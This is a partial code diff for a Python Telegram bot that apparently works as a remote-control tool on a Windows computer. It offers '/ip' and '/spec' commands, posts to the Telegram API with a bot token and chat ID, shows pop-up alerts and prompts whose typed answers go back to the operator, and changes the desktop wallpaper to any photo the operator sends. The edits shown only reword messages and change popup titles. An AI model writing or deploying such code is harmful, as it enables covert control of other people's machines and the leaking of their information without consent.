@@ -16,6 +16,7 @@ requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID
 
 @bot.message_handler(commands=['start'])
 def start(message):
+    bot.send_message(message.chat.id, f'Привет, {message.from_user.first_name}')
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
     item1 = types.KeyboardButton('/ip')
     item2 = types.KeyboardButton('/spec')
@@ -76,7 +77,7 @@ def msg_sending(msg):
 
 def nms(msg):
     try:
-        pyautogui.alert(msg.text, '~')
+        pyautogui.alert(msg.text, '777')
     except Exception:
         bot.send_message(msg.chat.id, 'Что-то пошло не так')
 
@@ -89,13 +90,13 @@ def msg_sending(msg):
 
 def nmswi(msg):
     try:
-        answer = pyautogui.prompt(msg.text, '~')
+        answer = pyautogui.prompt(msg.text, '777')
         bot.send_message(msg.chat.id, answer)
     except Exception:
         bot.send_message(msg.chat.id, 'Что-то пошло не так')
 
 
-@bot.message_handler(content_types=['text', 'photo'])
+@bot.message_handler(content_types=['photo'])
 def next_wp(msg):
     try:
         file = msg.photo[-1].file_id
@@ -107,9 +108,9 @@ def next_wp(msg):
 
         path = os.path.abspath('image.jpg')
         ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
-        bot.send_message(msg.chat.id, 'Обои поменяны')
+        bot.send_message(msg.chat.id, 'Я поменял обои')
     except TypeError:
-        bot.send_message(msg.chat.id, 'Пришлите мне фотографию')
+        bot.send_message(msg.chat.id, 'Пришлите мне фотографию для того чтобы поменять обои')
 
 
 bot.polling(none_stop=True, interval=0)
